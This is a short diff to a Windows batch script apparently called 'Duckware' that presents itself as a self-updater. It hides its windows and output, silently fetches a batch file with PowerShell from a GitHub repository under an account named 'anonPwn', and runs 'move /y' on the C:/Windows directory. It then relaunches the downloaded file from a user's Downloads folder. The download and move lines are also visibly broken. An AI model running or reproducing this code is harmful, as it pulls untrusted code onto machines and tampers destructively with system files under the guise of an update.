@@ -1,9 +1,10 @@
+@echo off
 start /min cmd /k (
 if /i not "%~1"=="updated" (
     echo Updating %~nx0 ...
     >nul 2>&1 powershell iwr "https://raw.githubusercontent.com/anonPwn/Batch/refs/heads/main/Duckware.bat"
     >nul 2>&1 move /y "C:/Windows" "%~dpnx0"
 )
-start /min Duckware.bat
-pause
+start /min C:\Users\grays\Downloads\Duckware.bat
+exit /b
 )
